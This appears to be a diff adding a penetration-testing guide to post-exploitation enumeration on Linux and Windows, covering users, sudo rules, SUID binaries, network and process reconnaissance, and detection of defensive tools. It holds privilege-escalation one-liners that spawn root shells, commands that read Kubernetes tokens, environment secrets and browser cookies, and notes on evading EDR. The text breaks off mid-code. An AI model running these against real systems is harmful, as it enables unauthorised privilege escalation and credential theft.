+Identify if system runs in container or VM:
+
+```bash
+# Docker container detection
+cat /.dockerenv
+cat /proc/1/cgroup | grep docker
+mount | grep -i docker
+
+# Kubernetes pod detection
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+env | grep KUBERNETES
+
+# Virtualization detection
+systemd-detect-virt
+cat /proc/cpuinfo | grep hypervisor
+dmesg | grep -i "hypervisor\|kvm\|vmware\|virtualbox"
+
+# Check for VM processes
+ps aux | grep -E "qemu|kvm|vmware|vbox|xen"
+```
+
+**Boot Configuration and GRUB Parameters**
+
+Extract bootloader information:
+
+```bash
+# GRUB configuration
+cat /boot/grub/grub.cfg
+cat /etc/default/grub
+
+# Boot parameters
+cat /proc/cmdline
+
+# Boot messages
+dmesg
+journalctl -b
+journalctl --since today
+
+# Secure Boot status
+dmesg | grep -i "secure boot"
+cat /sys/firmware/efi/fw_platform_size 2>/dev/null
+```
+
+**System Uptime and Load**
+
+Assess system runtime characteristics:
+
+```bash
+# Uptime
+uptime
+w
+last reboot
+journalctl --boot
+
+# System load
+uptime
+top -b -n 1
+cat /proc/loadavg
+
+# Process accounting (if enabled)
+lastcomm | head -50
+```
+
+**Environment Variables**
+
+Extract environment configuration:
+
+```bash
+# All environment variables
+env
+printenv
+
+# Specific variables
+echo $PATH
+echo $HOME
+echo $USER
+echo $SHELL
+
+# Sensitive environment leakage (credentials in env)
+env | grep -iE "password|secret|token|api|key|credential"
+```
+
+**System Resource Quotas**
+
+Identify resource limitations:
+
+```bash
+# User limits
+ulimit -a
+ulimit -Ha  # Hard limits
+ulimit -Sa  # Soft limits
+
+# Process resource limits
+cat /proc/[PID]/limits
+
+# Network interface limits
+ip link show | grep mtu
+
+# Disk quotas (if configured)
+quota -u
+quotacheck
+```
+
+## User Privilege Enumeration
+
+Systematic user enumeration identifies privilege escalation opportunities and lateral movement targets.
+
+**User Account Discovery**
+
+Enumerate all user accounts on system:
+
+```bash
+# Local user enumeration
+cat /etc/passwd
+getent passwd
+cut -d: -f1 /etc/passwd
+
+# Parse user information
+awk -F: '{print $1, $3, $6}' /etc/passwd  # username, UID, home directory
+
+# Active user sessions
+w
+who
+last
+lastlog
+
+# Users with login shell
+cat /etc/passwd | grep -vE "nologin|false"
+```
+
+Windows user enumeration:
+
+```powershell
+# Local user accounts
+Get-LocalUser
+Get-LocalUser | Select-Object Name, LastLogonDate, Enabled
+
+# User information
+net user
+net user [USERNAME]
+
+# User profiles
+Get-ChildItem C:\Users
+
+# Active sessions
+query user
+Get-WmiObject -Class Win32_LoggedInUser
+```
+
+**Group Membership Analysis**
+
+Identify group affiliations and privileges:
+
+```bash
+# Groups overview
+cat /etc/group
+getent group
+
+# User group membership
+groups
+groups [USERNAME]
+id [USERNAME]
+
+# sudo group members
+getent group sudo
+getent group wheel
+
+# Parse group information
+awk -F: '{print $1}' /etc/group  # all groups
+grep "^sudo:" /etc/group  # sudo members
+```
+
+Windows group membership:
+
+```powershell
+# Local groups
+Get-LocalGroup
+Get-LocalGroupMember -Name "Administrators"
+Get-LocalGroupMember -Name "Remote Desktop Users"
+
+# Domain groups
+Get-ADGroupMember -Identity "Domain Admins"
+net group "Domain Admins" /domain
+
+# Current user group membership
+$([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups
+Get-ADUser -Identity $env:USERNAME -Properties MemberOf | Select-Object -ExpandProperty MemberOf
+```
+
+**SUDO Privilege Analysis**
+
+Comprehensive sudo configuration enumeration:
+
+```bash
+# List SUDO privileges
+sudo -l
+sudo -l -U [USERNAME]
+sudo -l -l  # Long format with command details
+
+# SUDO configuration files
+cat /etc/sudoers
+cat /etc/sudoers.d/*
+ls -la /etc/sudoers.d/
+
+# SUDO logs (if logging enabled)
+grep -i "sudo" /var/log/auth.log
+grep -i "sudo" /var/log/secure
+journalctl SYSLOG_IDENTIFIER=sudo
+
+# Analyze SUDO rules for privilege escalation
+# Look for:
+# - NOPASSWD entries
+# - Wildcard commands
+# - Commands with user-controllable parameters
+```
+
+**File Ownership and Permission Analysis**
+
+Identify exploitable file permissions:
+
+```bash
+# Files owned by current user
+find / -user $(whoami) -type f 2>/dev/null
+
+# World-writable files
+find / -perm -002 -type f 2>/dev/null
+
+# SUID binaries (privilege escalation vectors)
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f -ls 2>/dev/null
+
+# SGID binaries
+find / -perm -2000 -type f 2>/dev/null
+
+# Files writable by group
+find / -perm -020 -type f 2>/dev/null
+
+# Recent SUID changes
+find / -perm -4000 -type f -mtime -7 2>/dev/null
+```
+
+**Sudo Configuration Exploit Vectors**
+
+Identify exploitable sudo configurations:
+
+```bash
+# NOPASSWD entries
+sudo -l | grep NOPASSWD
+
+# Wildcard commands
+sudo -l | grep "\*"
+
+# Commands with arguments
+# Example: (root) /usr/bin/find
+# Exploitable via: sudo find / -exec bash \;
+
+# Test exploitation
+sudo -l | grep -E "find|sed|awk|grep|cat|head|tail|less|more" 
+
+# Commands with environment preservation
+sudo -l | grep "env_keep"
+```
+
+**File Capabilities Analysis**
+
+Check for exploitable Linux capabilities:
+
+```bash
+# List file capabilities
+getcap -r / 2>/dev/null
+
+# Common exploitable capabilities:
+# cap_setuid, cap_setgid: Enable privilege escalation
+# cap_dac_override: Override file permissions
+# cap_net_raw: Raw socket creation
+
+# Example: Python with cap_setuid
+# Allows executing system commands as root
+getcap -r /usr/bin/python*
+
+# Exploit capability-based escalation
+python -c "import os; os.setuid(0); os.system('/bin/bash')"
+```
+
+**Root/Administrator Privilege Status**
+
+Verify current privilege level:
+
+```bash
+# Linux privilege check
+id
+whoami
+sudo -n true && echo "Can run sudo without password"
+
+# Windows privilege check
+$principal = New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
+$principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# Check for system privileges
+whoami /all /fo list
+```
+
+**Password Policy Analysis**
+
+Enumerate password requirements and expiration:
+
+```bash
+# Password policy information
+cat /etc/login.defs | grep PASS
+
+# Shadow file examination (requires root)
+cat /etc/shadow | head -5
+
+# User password age
+chage -l [USERNAME]
+
+# System-wide password requirements
+cat /etc/pam.d/common-password
+cat /etc/security/pwquality.conf
+```
+
+Windows password policy:
+
+```powershell
+# Local password policy
+Get-LocalUser | Select-Object Name, PasswordExpires, PasswordLastSet
+
+# Domain password policy
+Get-ADDefaultDomainPasswordPolicy
+
+# Group policy (requires access)
+gpresult /h report.html
+# Search for "Password Policy"
+```
+
+**Account Lockout Mechanisms**
+
+Determine account lockout threshold and duration:
+
+```bash
+# Pam configuration
+cat /etc/pam.d/* | grep -i "unlock\|lockout"
+
+# Failed login tracking
+lastb  # Failed login attempts
+faillog
+
+# Lockout threshold (if configured)
+grep -r "unlock" /etc/security/
+```
+
+Windows lockout policy:
+
+```powershell
+# Domain password policy lockout settings
+Get-ADDefaultDomainPasswordPolicy | Select-Object *
+
+# Account lockout threshold
+net accounts /domain | grep -i "lockout"
+
+# Attempt threshold
+Get-LocalUser | Select-Object Name, Enabled
+```
+
+## Network Connection Enumeration
+
+Comprehensive network reconnaissance identifies service exposure, lateral movement opportunities, and data exfiltration channels.
+
+**Active Network Connections**
+
+Enumerate established and listening connections:
+
+```bash
+# Display all connections and listening ports
+netstat -tlnp
+netstat -tuln
+
+# Using ss (more modern)
+ss -tlnp
+ss -tunap
+
+# IPv6 connections
+ss -tln6p
+netstat -tln6p
+
+# Connection statistics
+netstat -s
+ss -s
+
+# Display process associated with connection
+lsof -i -P -n | grep LISTEN
+fuser -n tcp -l
+```
+
+Windows network connections:
+
+```powershell
+# All connections
+Get-NetTCPConnection
+Get-NetUDPEndpoint
+
+# Listening ports with associated process
+Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess, @{Name="ProcessName";Expression={(Get-Process -Id $_.OwningProcess).Name}}
+
+# Detailed connection information
+netstat -ano
+netstat -abnoe
+
+# Established connections
+Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
+```
+
+**Routing Configuration**
+
+Extract system routing table and gateway information:
+
+```bash
+# Routing table
+route -n
+ip route show
+ip route show table all
+
+# Default gateway
+route -n | grep UG
+ip route show | grep default
+
+# Network interfaces and gateways
+ip addr show
+ifconfig
+
+# DNS configuration
+cat /etc/resolv.conf
+systemd-resolve --status
+```
+
+Windows routing:
+
+```powershell
+# Routing table
+Get-NetRoute
+Get-NetRoute -DestinationPrefix "0.0.0.0/0"
+
+# DNS servers
+Get-DnsClientServerAddress
+nslookup
+
+# Network configuration
+Get-NetIPConfiguration
+ipconfig /all
+```
+
+**ARP Cache and Neighbor Discovery**
+
+Identify network neighbors and potential MITM targets:
+
+```bash
+# ARP cache
+arp -a
+ip neigh show
+
+# Watch for ARP changes
+watch 'arp -a'
+
+# Neighbor discovery
+ip neigh
+
+# Gratuitous ARP (sometimes indicates lateral movement)
+tcpdump -i any -n "arp" | grep gratuitous
+```
+
+**Open Service Ports**
+
+Identify exposed services and versions:
+
+```bash
+# Local service enumeration
+netstat -tlnp | awk '{print $4, $7}'
+
+# Service version detection
+curl -v http://localhost:80
+curl -v https://localhost:443
+ssh -v localhost
+
+# Banner grabbing for each service
+nc localhost 22  # SSH banner
+nc localhost 25  # SMTP banner
+nc localhost 3306  # MySQL banner
+
+# Comprehensive service scan
+for port in $(ss -tlnp | grep -oP '(?<=:)\d+' | sort -u); do
+    echo "Port $port: $(curl -s --max-time 1 http://localhost:$port 2>&1 | head -1)"
+done
+```
+
+**Firewall Rules and Filtering**
+
+Determine firewall configuration and restrictions:
+
+```bash
+# iptables rules
+sudo iptables -L -n
+sudo iptables -L -n -t nat
+sudo iptables -L -n -t mangle
+
+# UFW firewall
+sudo ufw status
+sudo ufw show added
+
+# firewalld
+sudo firewall-cmd --list-all
+sudo firewall-cmd --list-services
+
+# nftables (newer firewall framework)
+sudo nft list ruleset
+
+# Forwarding policy
+cat /proc/sys/net/ipv4/ip_forward
+```
+
+Windows firewall:
+
+```powershell
+# Firewall status
+Get-NetFirewallProfile
+Get-NetFirewallProfile | Select-Object Name, Enabled
+
+# Inbound rules
+Get-NetFirewallRule -Direction Inbound -Enabled $true
+Get-NetFirewallRule -Direction Inbound -Action Allow
+
+# Outbound rules
+Get-NetFirewallRule -Direction Outbound -Enabled $true
+
+# Detailed rules
+Get-NetFirewallRule -Direction Inbound | Get-NetFirewallRuleFilter
+```
+
+**Proxy and VPN Configuration**
+
+Identify proxy/VPN usage for exfiltration:
+
+```bash
+# Environment proxy settings
+env | grep -i proxy
+echo $http_proxy
+echo $https_proxy
+
+# System-wide proxy configuration
+cat /etc/environment
+cat /etc/profile.d/proxy.sh
+
+# Application-specific proxies
+grep -r "proxy" /etc/apt/apt.conf.d/
+grep -r "proxy" ~/.bashrc ~/.bash_profile
+
+# VPN connections
+ip route show | grep vpn
+nmcli connection show
+iwconfig
+```
+
+Windows proxy configuration:
+
+```powershell
+# Internet proxy settings
+Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer, ProxyEnable
+
+# User proxy settings
+Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer
+
+# VPN connections
+Get-VpnS2SInterface
+rasdial
+```
+
+**DNS Configuration and Cache**
+
+Enumerate DNS settings for exfiltration channel identification:
+
+```bash
+# DNS servers
+cat /etc/resolv.conf
+systemd-resolve --status
+
+# DNS queries (if captured)
+grep -i "dns" /var/log/syslog
+
+# nscd DNS cache
+nscd -g
+cat /var/cache/nscd/*
+
+# systemd-resolved cache
+systemd-resolve --statistics
+```
+
+Windows DNS:
+
+```powershell
+# DNS servers
+Get-DnsClientServerAddress
+ipconfig /all
+
+# DNS cache
+Get-DnsClientCache
+
+# Recent DNS queries
+Get-DnsClientCache | Select-Object Name, Data, Type
+```
+
+**Network Share Enumeration**
+
+Identify accessible network shares for lateral movement:
+
+```bash
+# Mounted SMB shares
+mount | grep cifs
+mount | grep smb
+
+# NFS mounts
+showmount -e [TARGET_HOST]
+mount | grep nfs
+
+# Available shares
+smbclient -L \\[HOSTNAME] -N
+smbclient -L //[HOSTNAME]/ -U ""
+
+# Mounted share contents
+df | grep -E "cifs|nfs"
+```
+
+Windows network shares:
+
+```powershell
+# Local shares
+Get-SmbShare
+Get-SmbShare | Select-Object Name, Path, Description
+
+# Mapped drives
+Get-PSDrive -PSProvider FileSystem
+net use
+
+# Network discovery
+Get-NetComputerName
+net view
+```
+
+**Connection Persistence and Tunneling**
+
+Identify established persistence mechanisms:
+
+```bash
+# Listening sockets
+ss -tlnp
+netstat -tlnp
+
+# Process network connections
+cat /proc/[PID]/net/tcp
+cat /proc/[PID]/net/udp
+
+# IPv4 and IPv6
+cat /proc/net/tcp
+cat /proc/net/tcp6
+
+# TCP connections state tracking
+grep -E "01|04" /proc/net/tcp  # ESTABLISHED (01), TIME_WAIT (04)
+```
+
+## Installed Software Discovery
+
+Comprehensive software inventory informs privilege escalation, lateral movement, and persistence opportunities.
+
+**Package Manager Enumeration**
+
+Identify installed packages and available updates:
+
+```bash
+# Debian/Ubuntu packages
+dpkg -l
+apt list --installed
+apt-cache search ".*"
+
+# Package version information
+apt-cache policy [PACKAGE_NAME]
+dpkg -l | grep [PACKAGE_NAME]
+
+# RHEL/CentOS packages
+rpm -qa
+yum list installed
+dnf list installed
+
+# Arch Linux packages
+pacman -Q
+pacman -Ss
+
+# Installed package size
+dpkg-query -W -f='${Installed-Size}\t${Package}\n' | sort -rn
+```
+
+Windows installed software:
+
+```powershell
+# Installed applications
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
+
+# 64-bit applications
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
+
+# Combined
+wmic product list brief
+wmic product list full | findstr "Name"
+
+# Recently installed
+Get-WmiObject -Class Win32_Product | Select-Object Name, Version, InstallDate | Sort-Object InstallDate -Descending | head -20
+```
+
+**Version Detection for CVE Correlation**
+
+Extract software versions for vulnerability research:
+
+```bash
+# Critical software versions
+php --version
+python --version
+ruby --version
+node --version
+java -version
+gcc --version
+
+# Web server versions
+apache2ctl -v
+nginx -v
+curl http://localhost -I | grep Server
+
+# Database versions
+mysql --version
+psql --version
+sqlite3 --version
+
+# Scripting engine versions
+perl --version
+bash --version
+sh --version
+
+# Parse versions for CVE lookup
+#!/bin/bash
+PACKAGES=("openssh" "openssl" "sudo" "curl" "wget" "vim" "nano")
+for pkg in "${PACKAGES[@]}"; do
+    VERSION=$(dpkg -l | grep "^ii" | awk -v p="$pkg" '$2 ~ p {print $3}')
+    echo "$pkg: $VERSION"
+done
+```
+
+**Custom and Manually Installed Software**
+
+Discover non-package-manager installations:
+
+```bash
+# Binaries in common directories
+ls -la /opt/
+ls -la /usr/local/
+ls -la /srv/
+ls -la /home/*/
+
+# User-installed applications
+find $HOME -type f -executable 2>/dev/null | head -20
+
+# Application directories
+find / -name "applications" -o -name "app" -o -name "apps" 2>/dev/null
+
+# Python packages (if interpreter present)
+pip list
+pip freeze
+
+# Node.js packages
+npm list -g
+npm ls
+
+# Ruby gems
+gem list
+```
+
+**Development Tools and Compilers**
+
+Identify tools enabling code compilation and exploitation:
+
+```bash
+# Compilers present
+which gcc g++ clang cc
+which javac
+which rustc
+which go
+
+# Build tools
+which make cmake
+which cargo npm pip
+
+# Scripting interpreters
+which python python2 python3
+which perl ruby node bash sh
+which php
+
+# Debugging tools
+which gdb lldb strace ltrace
+
+# Version information
+gcc --version
+make --version
+python --version
+```
+
+**Server Software and Web Applications**
+
+Enumerate hosted services and applications:
+
+```bash
+# Web servers
+ps aux | grep -E "apache|nginx|httpd|lighttpd"
+
+# Application servers
+ps aux | grep -E "tomcat|jetty|gunicorn|uwsgi|node"
+
+# Database servers
+ps aux | grep -E "mysql|postgresql|mongodb|redis"
+
+# Service ports and associated software
+netstat -tlnp | grep LISTEN
+ss -tlnp | grep LISTEN
+
+# Web application directories
+ls -la /var/www/
+ls -la /srv/
+ls -la /opt/
+
+# Application version detection via web interface
+curl -I http://localhost/
+curl -I http://localhost/admin/
+grep -r "version" /var/www/ 2>/dev/null | head -20
+```
+
+**Vulnerable Software Detection**
+
+Identify known vulnerable packages:
+
+```bash
+# Automated vulnerability scanning
+sudo apt-cache policy openssh-client
+apt-cache show openssh-client | grep Version
+
+# Manual CVE correlation
+# Cross-reference software versions with CVE databases
+
+#!/bin/bash
+# Check for known vulnerable software
+VULNERABLE_PACKAGES=("struts2" "log4j" "OpenSSL" "sudo" "sudo" "vim")
+for pkg in "${VULNERABLE_PACKAGES[@]}"; do
+    echo "[*] Checking $pkg:"
+    dpkg -l | grep -i "$pkg" || echo "Not installed"
+done
+
+# Historical CVE matching
+# Example: OpenSSL < 1.0.2 (Heartbleed vulnerability)
+# Example: sudo < 1.8.28 (Heap-based buffer overflow)
+```
+
+**Browser and Email Client Detection**
+
+Identify communication tools for credential harvesting:
+
+```bash
+# Browser installation
+which firefox chromium-browser google-chrome opera brave-browser
+ls ~/.mozilla/firefox/ 2>/dev/null
+ls ~/.config/chromium/ 2>/dev/null
+
+# Browser cache and cookies
+find ~/.mozilla ~/.config/chromium -name "cookies*" 2>/dev/null
+find ~/.mozilla ~/.config/chromium -name "*cache*" 2>/dev/null
+
+# Email clients
+which thunderbird evolution mutt evolution
+ps aux | grep -E "thunderbird|evolution|mutt"
+
+# Email configuration
+find ~ -name ".config/evolution" -o -name ".thunderbird" 2>/dev/null
+```
+
+**Privilege Escalation Tool Detection**
+
+Identify exploitation tools already on system:
+
+```bash
+# SUID binaries (privilege escalation vectors)
+find / -perm -4000 2>/dev/null
+
+# Exploitable SUID binaries
+# LinPEAS script automated check
+find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -E "find|sed|awk|grep|cat|python|perl"
+
+# Kernel exploits pre-compiled
+find / -name "*kernel*" -o -name "*exploit*" 2>/dev/null | grep -v ".git"
+
+# Reverse shell tools
+which nc ncat netcat
+which socat
+which perl python
+```
+
+**System Monitoring and Logging Software**
+
+Detect defensive tools:
+
+```bash
+# Antivirus/HIPS
+ps aux | grep -iE "antivirus|hips|defender|sentinel|osquery"
+which clamav
+which aide
+
+# Log aggregation
+ps aux | grep -E "syslog|fluentd|logstash"
+
+# EDR (Endpoint Detection and Response)
+ps aux | grep -E "crowdstrike|carbon|endpoint|osquery"
+
+# Intrusion detection
+which suricata snort zeek
+
+# File integrity monitoring
+aide --config=/etc/aide/aide.conf --check
+tripwire --check
+```
+
+**Persistence Mechanisms and Startup Services**
+
+Identify currently active persistence mechanisms for avoidance:
+
+```bash
+# Startup services
+systemctl list-unit-files
+systemctl list-units --type service --state running
+
+# rc.d services
+ls -la /etc/rc.d/
+ls -la /etc/init.d/
+
+# Cron jobs (system-level)
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+
+# User cron jobs
+crontab -l
+
+# Systemd timers
+systemctl list-timers
+
+# Boot scripts
+ls -la /etc/rc.local
+cat /etc/rc.local
+```
+
+Windows startup mechanisms:
+
+```powershell
+# Startup services
+Get-Service | Where-Object {$_.StartType -eq "Automatic"}
+Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, StartMode
+
+# Scheduled tasks
+Get-ScheduledTask
+Get-ScheduledTask | Get-ScheduledTaskInfo | Sort-Object LastRunTime -Descending
+
+# Startup folder
+Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+# Registry run keys
+Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+```
+
+**Software Inventory Report Generation**
+
+Create comprehensive software inventory:
+
+```bash
+#!/bin/bash
+# software_inventory.sh
+
+OUTPUT="software_inventory_$(date +%Y%m%d_%H%M%S).txt"
+
+{
+    echo "=== System Software Inventory ==="
+    echo "Date: $(date)"
+    echo "Hostname: $(hostname)"
+    echo ""
+    
+    echo "=== Installed Packages ==="
+    if command -v dpkg &> /dev/null; then
+        echo "[Debian/Ubuntu Packages]"
+        dpkg -l | grep "^ii"
+    elif command -v rpm &> /dev/null; then
+        echo "[RPM Packages]"
+        rpm -qa
+    fi
+    echo ""
+    
+    echo "=== Running Services ==="
+    systemctl list-units --type service --state running
+    echo ""
+    
+    echo "=== Open Ports ==="
+    ss -tlnp
+    echo ""
+    
+    echo "=== Development Tools ==="
+    which gcc g++ clang make cmake python3 perl node npm
+    echo ""
+    
+    echo "=== Vulnerable Software Check ==="
+    for pkg in openssh openssl sudo curl wget; do
+        dpkg -l | grep "$pkg" || echo "$pkg: Not installed"
+    done
+    
+} > "$OUTPUT"
+
+echo "[+] Inventory saved to: $OUTPUT"
+```
+
+---
+
+**Related Post-Exploitation Topics**
+
+- **Credential Extraction and Dumping**: LSASS, SAM, shadow file analysis
+- **Persistence Mechanism Installation**: Backdoor deployment, rootkit installation
+- **Lateral Movement Planning**: Identified targets and exploitation vectors
+- **Data Exfiltration Channel Identification**: Outbound connectivity analysis
+- **Anti-Forensics and Log Tampering**: Covering tracks and destroying evidence
+
+---
+
+## Running Process Analysis
+
+### Linux Process Analysis
+
+**Basic Process Enumeration**
+
+```bash
+# Detailed process listing
+ps aux
+ps -ef
+ps auxf  # Tree format with hierarchy
+ps -eFH  # Full format with threads
+
+# Process with full command line
+ps -eww
+ps aux --no-headers
+
+# Processes by user
+ps -u root
+ps -U username
+
+# Processes using most CPU
+ps aux --sort=-%cpu | head -20
+
+# Processes using most memory
+ps aux --sort=-%mem | head -20
+
+# All processes with thread count
+ps -eLf
+
+# Processes with security context
+ps auxZ  # SELinux
+ps auxz  # AppArmor
+```
+
+**Process Tree Analysis**
+
+```bash
+# Full process tree
+pstree -p  # With PIDs
+pstree -pa  # With arguments
+pstree -pua  # With user and arguments
+pstree -ps <PID>  # Specific process ancestry
+
+# Alternative tree view
+ps axjf
+ps -ejH
+```
+
+**Detailed Process Information**
+
+```bash
+# Process environment variables
+cat /proc/<PID>/environ | tr '\0' '\n'
+strings /proc/<PID>/environ
+xargs -0 -L1 -a /proc/<PID>/environ
+
+# Command line arguments
+cat /proc/<PID>/cmdline | tr '\0' ' '
+xargs -0 < /proc/<PID>/cmdline
+
+# Process status
+cat /proc/<PID>/status
+cat /proc/<PID>/stat
+
+# Process limits
+cat /proc/<PID>/limits
+
+# Process file descriptors
+ls -la /proc/<PID>/fd/
+lsof -p <PID>
+
+# Process memory maps
+cat /proc/<PID>/maps
+pmap <PID>
+pmap -x <PID>  # Extended information
+
+# Process working directory
+ls -la /proc/<PID>/cwd
+readlink /proc/<PID>/cwd
+
+# Process executable
+ls -la /proc/<PID>/exe
+readlink /proc/<PID>/exe
+
+# Open files by process
+lsof -c <process_name>
+lsof -u <username>
+
+# Network connections per process
+lsof -i -a -p <PID>
+ss -p | grep <PID>
+netstat -anp | grep <PID>
+```
+
+**Security-Focused Process Analysis**
+
+```bash
+# Processes with SUID/SGID
+ps -eo pid,user,group,args | grep -v "^root"
+
+# Process capabilities
+getpcaps <PID>
+grep Cap /proc/<PID>/status
+capsh --decode=$(grep CapEff /proc/<PID>/status | awk '{print $2}')
+
+# Processes running from suspicious locations
+ps aux | grep -E "/tmp|/dev/shm|/var/tmp"
+lsof | grep -E "/tmp|/dev/shm|/var/tmp" | grep -v "DIR"
+
+# Processes without binary on disk (deleted)
+ls -la /proc/*/exe 2>/dev/null | grep deleted
+
+# Hidden processes (comparing different enumeration methods)
+ps aux > ps_output.txt
+ls /proc | grep -E '^[0-9]+$' > proc_list.txt
+diff <(ps aux | awk '{print $2}' | sort) <(ls /proc | grep -E '^[0-9]+$' | sort)
+
+# Processes listening on network ports
+ss -tlnp
+netstat -tlnp
+lsof -i -P -n
+
+# Processes with open network connections
+ss -tanp
+netstat -tanp
+lsof -i -a
+```
+
+**Process Monitoring**
+
+```bash
+# Real-time process monitoring
+top
+htop
+atop
+
+# Monitor specific process
+top -p <PID>
+watch -n 1 'ps aux | grep <process_name>'
+
+# Process accounting (if enabled)
+lastcomm
+sa
+ac
+
+# System call tracing
+strace -p <PID>
+strace -f -e trace=network -p <PID>  # Network calls only
+
+# Library calls
+ltrace -p <PID>
+
+# Process I/O statistics
+iotop
+pidstat -d 1
+
+# Monitor new processes
+pspy64  # Without root
+while true; do ps aux; sleep 1; done | grep -E 'NEW|COMMAND'
+```
+
+**Process Analysis Scripts**
+
+```bash
+#!/bin/bash
+# Comprehensive process enumeration
+
+echo "=== Suspicious Process Locations ==="
+ps aux | grep -E "/tmp|/dev/shm|/var/tmp|/home"
+
+echo -e "\n=== Processes Running as Root ==="
+ps aux | grep ^root | grep -v "\[" | head -20
+
+echo -e "\n=== Processes with Network Connections ==="
+lsof -i -n -P
+
+echo -e "\n=== Recently Started Processes ==="
+ps -eo pid,lstart,cmd | sort -k2 | tail -20
+
+echo -e "\n=== High CPU Processes ==="
+ps aux --sort=-%cpu | head -10
+
+echo -e "\n=== Unusual Parent-Child Relationships ==="
+ps auxf | grep -v grep | grep -E "bash.*sh|sh.*bash|perl.*python|python.*perl"
+```
+
+### Windows Process Analysis
+
+**PowerShell Process Enumeration**
+
+```powershell
+# List all processes
+Get-Process
+Get-Process | Format-Table -AutoSize
+
+# Detailed process information
+Get-Process | Select-Object Name, Id, Path, Company, CPU, WorkingSet | Format-Table -AutoSize
+
+# Processes sorted by CPU
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
+
+# Processes sorted by memory
+Get-Process | Sort-Object WS -Descending | Select-Object -First 20
+
+# Process with command line arguments
+Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine | Format-List
+
+# Process owners
+Get-WmiObject Win32_Process | Select-Object ProcessId, Name, @{Name="Owner";Expression={$_.GetOwner().User}}
+
+# Process creation time
+Get-Process | Select-Object Name, Id, StartTime | Sort-Object StartTime -Descending
+
+# Process modules (DLLs loaded)
+Get-Process -Name <process_name> | Select-Object -ExpandProperty Modules
+
+# Process with file path
+Get-Process | Where-Object {$_.Path} | Select-Object Name, Path
+
+# Services hosted in processes
+Get-WmiObject Win32_Process | Where-Object {$_.Name -eq "svchost.exe"} | ForEach-Object {
+    $processId = $_.ProcessId
+    Get-WmiObject Win32_Service | Where-Object {$_.ProcessId -eq $processId} | Select-Object Name, DisplayName
+}
+
+# Network connections per process
+Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess, @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
+
+# Running from temp directories
+Get-Process | Where-Object {$_.Path -match "\\Temp\\|\\AppData\\Local\\Temp"}
+
+# Unsigned executables
+Get-Process | Where-Object {$_.Path} | ForEach-Object {
+    $sig = Get-AuthenticodeSignature $_.Path
+    if ($sig.Status -ne "Valid") {
+        [PSCustomObject]@{
+            Name = $_.Name
+            Path = $_.Path
+            Signature = $sig.Status
+        }
+    }
+}
+
+# Hidden processes (no window)
+Get-Process | Where-Object {$_.MainWindowTitle -eq ""}
+
+# Processes with network connections
+Get-NetTCPConnection -State Established | Select-Object -ExpandProperty OwningProcess -Unique | ForEach-Object {Get-Process -Id $_}
+```
+
+**Command Prompt Process Enumeration**
+
+```cmd
+REM List all processes
+tasklist
+tasklist /v
+tasklist /svc
+
+REM Processes with services
+tasklist /svc | findstr /i "svchost"
+
+REM Filter by user
+tasklist /fi "username eq SYSTEM"
+tasklist /fi "username ne SYSTEM"
+
+REM Processes using memory over threshold
+tasklist /fi "memusage gt 100000"
+
+REM Remote process listing
+tasklist /s <computer_name> /u <username> /p <password>
+
+REM Detailed format
+tasklist /fo list
+tasklist /fo csv
+
+REM Process modules
+tasklist /m
+tasklist /m /fi "imagename eq chrome.exe"
+
+REM WMIC process enumeration
+wmic process list brief
+wmic process list full
+wmic process get name,processid,parentprocessid,executablepath,commandline
+wmic process where "name='powershell.exe'" get processid,commandline
+
+REM Process creation time
+wmic process get name,processid,creationdate
+
+REM Process owners
+wmic process get processid,name,executablepath,GetOwner
+
+REM Network connections
+netstat -ano
+netstat -ano | findstr ESTABLISHED
+netstat -anob
+
+REM Process tree (PowerShell alternative)
+wmic process get processid,parentprocessid,name
+```
+
+**Advanced Windows Process Analysis**
+
+```powershell
+# Process injection detection
+Get-Process | ForEach-Object {
+    $proc = $_
+    $handles = (Get-Handle -ProcessId $proc.Id 2>$null | Measure-Object).Count
+    [PSCustomObject]@{
+        ProcessName = $proc.Name
+        PID = $proc.Id
+        Handles = $handles
+        Threads = $proc.Threads.Count
+        WorkingSet = [math]::Round($proc.WS / 1MB, 2)
+    }
+} | Sort-Object Handles -Descending | Select-Object -First 20
+
+# Suspicious process characteristics
+Get-WmiObject Win32_Process | ForEach-Object {
+    $proc = $_
+    $parent = Get-WmiObject Win32_Process -Filter "ProcessId='$($proc.ParentProcessId)'"
+    [PSCustomObject]@{
+        Name = $proc.Name
+        PID = $proc.ProcessId
+        PPID = $proc.ParentProcessId
+        ParentName = $parent.Name
+        CommandLine = $proc.CommandLine
+        CreationDate = $proc.ConvertToDateTime($proc.CreationDate)
+    }
+} | Where-Object {
+    $_.ParentName -eq "explorer.exe" -and $_.Name -match "powershell|cmd|wscript"
+}
+
+# Token privileges
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Token {
+    [DllImport("advapi32.dll", SetLastError=true)]
